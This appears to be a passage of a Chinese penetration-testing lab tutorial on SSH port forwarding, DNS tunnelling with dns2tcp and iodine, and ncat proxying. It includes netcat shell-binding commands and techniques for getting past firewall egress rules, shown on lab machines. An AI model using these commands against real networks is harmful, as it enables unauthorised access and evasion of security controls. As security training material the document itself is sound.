<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -fCNg -L &lt;listen port&gt;:localhost:&lt;remote port&gt; user@&lt;ssh server&gt; -p &lt;ssh port&gt;  </span><br><span class="line">ssh -fCNg -L  4002:localhost:80 root@192.168.159.129 -p 53</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230316215810154-1045186061.png" /></p>
<ul>
<li><strong>效果：</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230316215927680-2038834480.png" /></p>
<h3 id="nc-获取shell">4、nc 获取shell</h3>
<ul>
<li><strong>win2008开启监听</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -nvlp 4444</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230316213110811-677764557.png" /></p>
<ul>
<li><strong>kali-2.0命令：</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -fCNg -L 4003:192.168.159.134:4444 root@192.168.159.129 -p 53</span><br><span class="line">nc 127.0.0.1 4003 -c /bin/bash</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230316214514248-1110872916.png" /></p>
<ul>
<li><strong>win2008效果：</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230316214617825-1491941259.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230316214638908-1555889030.png" /></p>
<h3 id="远程桌面">5、远程桌面</h3>
<ul>
<li><strong>命令：</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -fCNg -L 4002:192.168.159.134:3389 root@192.168.159.129 -p 53  </span><br><span class="line"></span><br><span class="line">rdesktop 127.0.0.1:4002  </span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230316212151409-994671600.png" /></p>
<ul>
<li><strong>效果：</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230316212543688-584363732.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230316212742409-267992635.png" /></p>
<h2 id="ssh-远程端口转发">5. SSH 远程端口转发</h2>
<p>** 注，与前面不同点在于侦听端口在 kali-2022
上，也就是说，外网可以突破monowall访问内网机。此处以外网机 kali-2022
访问内网机 xp 的服务【IIS，远程桌面，nc为例】。**</p>
<ul>
<li>monowall【仅主机模式+NAT模式】:10.1.1.1</li>
<li>kali-2.0【仅主机模式】:10.1.1.3</li>
<li>xp【仅主机模式】:10.1.1.2</li>
<li>kali-2022【NAT模式】:192.168.159.129</li>
</ul>
<h3 id="xp安装iis">1、xp安装iis</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230316223112501-1763091234.png" /></p>
<p>如果安装时出现需要Windows XP Professional Service Pack 2 CD
上的文件'staxmem.dll，建议网上直接下载个iis安装包：https://s2.runjiapp.com/iis5.1_xz7.com.zip</p>
<h3 id="访问-xp-的iis">2、访问 xp 的iis</h3>
<ul>
<li><strong>kali-2.0 命令</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -fCNg -R 4001:10.1.1.2:80 root@192.168.159.129 -p 53</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>kali-2022 端口状态</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230317110020768-278038950.png" /></p>
<ul>
<li><strong>效果：</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230317120235744-422168156.png" /></p>
<h3 id="访问-xp-远程桌面">3、访问 xp 远程桌面</h3>
<ul>
<li><strong>kali-2.0 命令</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -fCNg -R 4002:10.1.1.2:3389 root@192.168.159.129 -p 53</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>kali-2022 效果：</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230317112144209-1761783468.png" /></p>
<h3 id="获取-nc-的-shell">4、获取 nc 的 shell</h3>
<ul>
<li><strong>kali-2.0 命令</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -fCNg -R 4003:10.1.1.2:4444 root@192.168.159.129 -p 53</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>xp先开启监听</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -nvlp 4444</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>kali-2022连接</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc  127.0.0.1 4003 -c /bin/bash</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>效果【xp】：</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230317113445224-578745875.png" /></p>
<h2 id="ssh动态端口转发">6. SSH动态端口转发</h2>
<ul>
<li><strong>注，环境接前</strong></li>
<li><strong>kali-2.0命令</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -fCNg -D 4444 root@192.168.159.129 -p 53</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230317120936938-941560117.png" />
<img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230317120806627-1328247263.png" /></p>
<ul>
<li><strong>xp效果：</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230317121130750-10804834.png" /></p>
<h2 id="x协议转发-1">7. X协议转发</h2>
<ul>
<li><p><strong>远程登陆 Linux GUI
运行图形化界面工具【特点】</strong></p></li>
<li><p>VNC</p></li>
<li><p>X windows</p></li>
<li><p><strong>防火墙限制访问时</strong></p></li>
<li><p>基于 SSH 的 X 转发，所有的操作都是记录在 kali-2022
中，本地kali-2.0只是查看和操作</p></li>
<li><p>ssh -X <a href="mailto:user@1.1.1.1">user@1.1.1.1</a> -p
53</p></li>
<li><p><strong>kali-2.0 命令【环境接上】:</strong></p></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -X root@192.168.159.129 -p 53</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>效果：</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230317123130201-1418783803.png" /></p>
<h2 id="dns-协议隧道">8. DNS 协议隧道</h2>
<ul>
<li><strong>防火墙禁止 TCP 出站访问流量</strong></li>
<li><strong>SSH 隧道、端口转发全部失效</strong></li>
<li><strong>重定向和 SSH 隧道只能适用于 TCP 53 端口，对 UDP 53
端口无法使用。</strong></li>
<li><strong>使用基于UDP协议的隧道</strong></li>
<li><strong>DNS 的工作原理适合用于实现隧道</strong></li>
<li><strong>DNS TCP 53 端口主要用于 DNS
服务器之间进行数据同步（区域传输），而用户提交的 DNS 查询请求，都是 UDP
53 端口的流量</strong></li>
<li><strong>DNS 工作原理，递归+迭代自行百度此处略</strong></li>
</ul>
<p><strong><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230401204417391-1891391657.png" /></strong></p>
<h3 id="dns-隧道原理">1、DNS 隧道原理</h3>
<p><strong>申请注册受自己控制的 DNS 服务器（如 .test.lab.com
域权威dns服务器），也就是说对于 *.test.lab.com 的权威解析由 test.lab.com
服务器来完成。为此我们可以在局域网（上图为例）中的主机在进行
test.lab.com 的子域解析请求时包含建立隧道的数据，在请求到达我们控制的
test.lab.com 服务器后，服务器根据请求做出响应，并将结果包含于 dns
解析的回包中返回给请求者，即建立dns隧道。这对于防火墙，缓存 dns
服务器等看来传输的流量也是正常合法的。另外由于缓存DNS服务器，其他权威服务器的存在对于我们控制的dns服务器而言也比较安全。</strong></p>
<h3 id="dns2tcp-工具介绍">2、dns2tcp 工具介绍</h3>
<ul>
<li><p><strong>dns2tcp</strong></p></li>
<li><p><strong>利用合法 DNS 服务器（缓存dns服务器）实现 DNS
隧道</strong></p></li>
<li><p><strong>C/S （dns2tcpc/dns2tcpd）结构，
dns2tcpc负责插入建立隧道的数据， dns2tcpd负责响应。</strong></p></li>
<li><p><strong>通过 TXT
记录加密传输数据（A记录长度有限），形式：建立隧道的请求数据.test.lab.com</strong></p></li>
<li><p><strong>隧道建立后保持连接，周期性请求-响应以确保服务器存活</strong></p></li>
<li><p><strong>默认记录生存时间 TTL 值为 3 秒</strong></p></li>
<li><p><strong>安装</strong></p></li>
<li><p>kali有自带，没得话用apt-get install dns2tcp 手动安装下。</p></li>
<li><p>服务器配置文件</p></li>
<li><p>/etc/dns2tcpd.conf</p></li>
<li><p>.dns2tcprcd</p></li>
<li><p>资源可以是其他地址</p></li>
<li><p>启动</p></li>
<li><p>dns2tcpd -F -d 1 -f /etc/dns2tcpd.conf</p></li>
<li><p>F:前端运行</p></li>
<li><p>d：debug level 1-3</p></li>
<li><p>f:指定配置文件</p></li>
</ul>
<h3 id="实验环境适用场景一">3、实验环境【适用场景一】</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230401213522728-130582881.png" /></p>
<ul>
<li><strong>内网机</strong></li>
<li>kali-2.0：10.1.1.3</li>
<li>确保已安装dns2tcp、wireshark、firefox</li>
<li><strong>配置DNS服务器</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230401223531184-107165947.png" /></p>
<ul>
<li><strong>测试【先把后面的环境配置完再测试这个】</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230401232639310-1860430892.png" /></p>
<ul>
<li><strong>防火墙</strong></li>
<li>monowall：10.1.1.1</li>
<li>防火墙：只允许出站UDP 53端口流量</li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230401220100987-957696727.png" /></p>
<ul>
<li><strong>缓存DNS服务器</strong></li>
<li>Win 2008：192.168.159.134</li>
<li>安装DNS服务；配置转发器，创建区域 lab.com，指派二级域
test.lab.com，NS记录指向Kali-2022</li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230401215122803-198156310.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230401215413318-410947725.png" /></p>
<p><strong>注</strong>
，因要做dns服务器所以IP得改成静态的，另外首选DNS服务器也改成自己的地址。</p>
<ul>
<li><strong>创建区域 lab.com</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230401220321150-430915778.png" /></p>
<ul>
<li><strong>新建主机记录</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230401220752159-261855132.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230401220841281-1037771244.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230401220855999-92819346.png" /></p>
<ul>
<li><strong>新建委派</strong>
【委派必须指向主机记录，不能直接指向kali-2022的IP地址】</li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230401221044985-95793873.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230401221202454-1819532084.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230401221437420-1365700617.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230401222804878-1327746945.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230401222832301-433774104.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230401222903149-861116897.png" /></p>
<ul>
<li><strong>配置转发器</strong>
【凡是解析不了的域名都使用转发器转发到类似于8.8.8.8的官方 dns
服务器】</li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230401223111289-2034634088.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230401223219112-1484911073.png" /></p>
<ul>
<li><strong>受控 DNS 服务器</strong></li>
<li>kali-2022：192.168.159.129</li>
<li>服务端的配置：即可直接修改 /etc/dns2tcpd.conf 文件，dns2tcpd
启动时用 -f 参数指定，也可再当前主目录新建个 .dns2tcprcd
文件【内容同前】让他启动时自己去查询加载。</li>
<li><strong>修改 /etc/dns2tcpd.conf 为例</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230402111104275-697923253.png" /></p>
<ul>
<li><strong>服务端启动</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dns2tcpd -F -d 1 -f /etc/dns2tcpd.conf </span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230402112611170-98929434.png" /></p>
<h3 id="建立隧道">4、建立隧道</h3>
<ul>
<li><strong>ssh 隧道</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dns2tcpc -c  -k 123.com -d 1  -l 4444  -r ssh -z test.lab.com</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230402121643291-1345263227.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230402121737033-529539882.png" /></p>
<p><strong>注，ssh 服务端【kali-2022】的配置修改同前，如果建立连接时遇到
ssh_exchange_identification:read connection reset by peer 问题，可在
/etc/hosts.allow 文件中添加个sshd: ALL【kali-2022端】，再重启 ssh
解决。</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230402122224956-258910843.png" /></p>
<ul>
<li><strong>http 服务</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dns2tcpc -c -k 123.com -d 1 -l 3333 -r http -z test.lab.com</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230402121125769-1103100191.png" /></p>
<p><strong>其它服务操作同理
……至于建立过程中的细节建议抓包了解</strong></p>
<h2 id="隧道嵌套">9. 隧道嵌套</h2>
<p><strong>基于 SSH 资源将 SSH 动态端口转发隧道嵌套于 DNS
隧道中【动态端口转发可以做成网关进行代理转发局域网内的主机连接流量
】</strong></p>
<p>实验环境接上</p>
<ul>
<li><strong>kali-2.0 操作</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#建立DNS隧道  </span></span><br><span class="line">dns2tcpc -c -k 123.com -d 1 -l 8080 -r ssh -z test.lab.com  </span><br><span class="line"><span class="comment">#建立嵌套于DNS隧道的SSH隧道</span></span><br><span class="line">ssh -CfNg root@127.0.0.1 -p 8080 -D 7001</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230402130454667-1741140563.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230402130520680-1010086152.png" /></p>
<ul>
<li><strong>效果</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230402125745955-1007321248.gif" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230402130538772-337041687.gif" /></p>
<h2 id="dns2tcp-适用场景二">10. dns2tcp 适用场景二</h2>
<ul>
<li>FW 限制只允许内网 DNS 服务器访问外网指定 DNS 服务器 UDP 53 端口</li>
<li>内网 DNS 服务器：安装 DNS 服务，配置转发器到外网 DNS 服务器</li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230402150454247-152541263.png" /></p>
<ul>
<li>实验环境基本同上，只不过内网中多个 DNS 服务器【win2003充当】</li>
</ul>
<h3 id="内网-dns-服务器配置">1、内网 DNS 服务器配置</h3>
<ul>
<li><strong>IP 配置</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230402151057851-203427402.png" /></p>
<ul>
<li><strong>转发器配置【自己解析不了的去访问外网特定DNS服务器】</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230402153105352-85166353.png" /></p>
<ul>
<li><strong>测试【后面配置完在测试】</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230402153145903-139766937.png" /></p>
<h3 id="monowall-配置">2、monowall 配置</h3>
<ul>
<li>仅允许内网DNS服务器访问外网特定DNS服务器</li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230402151507888-1595139242.png" /></p>
<h3 id="kali-2022-配置-1">3、kali-2022 配置</h3>
<ul>
<li><strong>squid 安装</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install squid </span><br></pre></td></tr></table></figure>
<ul>
<li><strong>squid 启动</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/etc/init.d/squid restart</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>dns2tcpd 配置及启动</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230402154219609-1878363024.png" /></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dns2tcpd -F -d 1 -f /etc/dns2tcpd.conf</span><br></pre></td></tr></table></figure>
<h3 id="外网-dns-服务器配置">4、外网 DNS 服务器配置</h3>
<ul>
<li>服务器直接用前面实验的已配置的缓存DNS服务器</li>
</ul>
<h3 id="内网-kali-2.0-配置">5、内网 kali-2.0 配置</h3>
<ul>
<li>配置 dns 指向内网中的DNS服务器【win2003-10.1.1.2】</li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230402155103372-109174572.png" /></p>
<ul>
<li><strong>测试</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dig -t ns test.lab.com</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230402155314170-1218552423.png" /></p>
<h3 id="建立隧道-1">6、建立隧道</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dns2tcpc -c -k 123.com -d 1 -l 8080 -r http -z test.lab.com</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230402155449463-1717305228.png" /></p>
<h3 id="测试">7、测试</h3>
<ul>
<li><strong>浏览器配置代理测试</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230402161446453-615198095.png" /></p>
<h2 id="dns-协议隧道工具-iodine-介绍">11. DNS 协议隧道工具 iodine
介绍</h2>
<ul>
<li><p><strong>基于 DNS 查询的隧道工具</strong></p></li>
<li><p><strong>与同类工具相比的优点</strong></p></li>
<li><p><strong>对下行数据不进行编码，因此性能优</strong></p></li>
<li><p><strong>支持多平台：Linux、BSD、Mac OS、Windows</strong></p></li>
<li><p><strong>最大16个并发链接</strong></p></li>
<li><p><strong>支持同网段隧道
IP（不同于服务器、客户端网段），即在隧道两端提供虚拟网卡及虚拟
IP</strong></p></li>
<li><p><strong>支持多种 DNS 记录类型【自行协商】</strong></p></li>
<li><p><strong>丰富的隧道质量检测措施</strong></p></li>
<li><p><strong>运行服务器端</strong></p></li>
<li><p><strong>iodined -f -c 10.0.0.1 test.lab.com</strong></p></li>
<li><p>-f：前段显示（可选）</p></li>
<li><p>-c：不检查客户端地址</p></li>
<li><p>IP：服务器端的隧道IP地址（不同于服务器主机IP和客户端主机IP，此IP仅用于隧道之间，在隧道的两端构成独立的网段）</p></li>
<li><p><strong>运行客户端</strong></p></li>
<li><p>指定IP：局域网内部的本地 DNS 服务器</p></li>
<li><p><strong>iodine -f test.lab.com</strong></p></li>
<li><p>curl --socks5-hostname 127.0.0.1:7001
http://www.sina.com</p></li>
<li><p><strong>隧道网络接口</strong></p></li>
<li><p>不基于资源的通用隧道，如同本网段内两台相邻的主机</p></li>
<li><p>隧道两端接口的IP地址应不同于客户端和服务器端网段</p></li>
<li><p><strong>基于此隧道可嵌套其他隧道技术</strong></p></li>
<li><p>ssh -CfNg -D 7001 root@10.0.0.1</p></li>
<li><p><strong>安装 TAP 网卡驱动</strong></p></li>
<li><p>https://openvpn.net/index.php/open-source/downloads.html 或 <a
href="https://build.openvpn.net/downloads/releases/"
class="uri">https://build.openvpn.net/downloads/releases/</a></p></li>
<li><p>只安装 TAP Virtual Ethernet Adapter 和所有依赖包</p></li>
<li><p><strong>注</strong>
，不同系统对版本有要求，如果测试时显示隧道建立成功，但实际 ping 不通
10.0.0.1，可换个 openvpn 版本装 TAP
虚拟网卡，个人测试【win7】成功的版本：<a
href="https://build.openvpn.net/downloads/releases/openvpn-install-2.3.11-I001-i686.exe"
class="uri">https://build.openvpn.net/downloads/releases/openvpn-install-2.3.11-I001-i686.exe</a></p></li>
<li><p><strong>Windows 客户端</strong></p></li>
<li><p>http://code.kryo.se/iodine/</p></li>
<li><p>iodine -f test.lab.com</p></li>
<li><p><strong>建立 SSH 隧道</strong></p></li>
</ul>
<h3 id="linux-环境下的实操">1、linux 环境下的实操</h3>
<ul>
<li><strong>实验环境接上</strong></li>
<li><strong>服务端操作</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230402174158405-1479841307.png" /></p>
<ul>
<li><strong>客户端操作</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230402174329038-1368564819.png" /></p>
<ul>
<li><strong>以 ssh 登录 kali-2022 为例测试效果</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230402174637002-583358104.png" /></p>
<ul>
<li><strong>嵌套 ssh 隧道测试</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -CfNg -D 7001 root@10.0.0.1</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230402175814954-140651995.png" /></p>
<p><strong>注</strong> ，浏览器要设代理，如下图</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230402175653093-2033482055.png" /></p>
<h3 id="windows-环境实操">2、Windows 环境实操</h3>
<ul>
<li><strong>以 win7 作为内网机为例</strong></li>
<li><strong>配置IP及DNS等</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230402215309839-966531234.png" /></p>
<ul>
<li><strong>测试</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230402214958067-1064024963.png" /></p>
<p><strong>建立隧道</strong></p>
<ul>
<li><strong>服务端【kali-2022】启动</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iodined -f -c 10.0.0.1 test.lab.com</span><br></pre></td></tr></table></figure>
<ul>
<li>win7 操作 【以管理员身份执行】</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iodine.exe -f test.lab.com</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230402215659690-95010808.png" /></p>
<ul>
<li><strong>测试效果</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230403092348653-342886806.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230403092609226-1369312671.png" /></p>
<ul>
<li><strong>隧道嵌套测试【基于DNS隧道建立 ssh 隧道】</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230403093051363-1106901834.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230403093130598-1229413503.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230403093248906-54142802.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230403093405667-1203516747.png" /></p>
<p><strong>注</strong>
，7001是本地监听端口，浏览器等可借助该端口出网【原理是这样，但我自己测试时浏览器依旧访问不了百度，可能那个操作有误】。</p>
<h2 id="隧道工具-ncat-介绍">12. 隧道工具 NCAT 介绍</h2>
<ul>
<li><strong>NCAT</strong></li>
<li>被称为众多 NC 衍生版中最优的选择</li>
<li>代理功能</li>
<li>默认侦听端口：31337</li>
<li>ncat -l 8080 --proxy-type http --proxy-auth user:passwd</li>
<li>如果防火墙未限制 53 端口的出站访问，那么可以在公网放一台 linux
机器，装上nmap（自带ncat），侦听 53 端口，可以代理内网机器访问外网资源
ncat -l 53 --proxy-type http --proxy-auth
user:passwd【实质和最前面提到的隧道一样】</li>
<li><strong>broker 中介功能【推荐学习】</strong></li>
<li>AC 不通，但AB、BC互通</li>
<li>服务器：ncat -l 333 --broker</li>
<li><strong>客户端和服务端之间发送的任何信息都会被发送/同步【类似于 hub
功能】到其他建立连接的客户端【重点】</strong></li>
<li>批量执行命令：ncat 1.1.1.1 --sh-exec "echo 'pwd'"</li>
<li>批量传文件：ncat --send-only 1.1.1.1 &lt; inputfile</li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230403113301997-1687523984.gif" /></p>
<ul>
<li><strong>应用场景</strong></li>
<li>A 内网客户端</li>
<li>B 服务端</li>
<li>C 外网客户端</li>
<li>A 无法直接访问 C（被防火墙隔离）</li>
<li>B 位于 AC 之间，可以同时连接AC，可以用 B 作为中介跳转</li>
<li>C 可以同时存在多个</li>
<li>A 发往 B 的信息，B 会同时发送给与其连接的
"C【客户端】"，除了发送命令，也可以传送文件。即可以获取敏感信息或写木马等。</li>
</ul>
<h3 id="ncat-代理演示">1、NCAT 代理演示</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ncat -l 8080 --proxy-type http --proxy-auth user:passwd</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230403110019686-944955077.png" /></p>
<h3 id="broker-中介功能演示">2、broker 中介功能演示</h3>
<ul>
<li>B：ncat -l 4444 --broker</li>
<li>C：ncat 127.0.0.1 4444</li>
<li>A：ncat 127.0.0.1 4444 --sh-exec "echo <code>pwd</code>"</li>
<li>注，IP地址根据所需替换，这里是在同一台机器演示故指为127.0.0.1</li>
</ul>
